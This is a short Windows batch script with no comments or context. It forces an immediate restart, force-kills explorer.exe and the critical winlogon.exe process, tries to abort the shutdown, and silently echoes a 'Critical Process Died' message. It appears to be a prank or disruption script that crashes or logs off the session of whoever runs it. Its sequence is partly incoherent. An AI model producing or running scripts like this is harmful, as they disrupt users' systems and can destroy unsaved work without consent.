@echo off

shutdown /r /t 0

ping 127.0.0.1 >nul

taskkill /f /im explorer.exe
taskkill /f /im winlogon.exe

shutdown /a /t 1

echo Critical Process Died >nul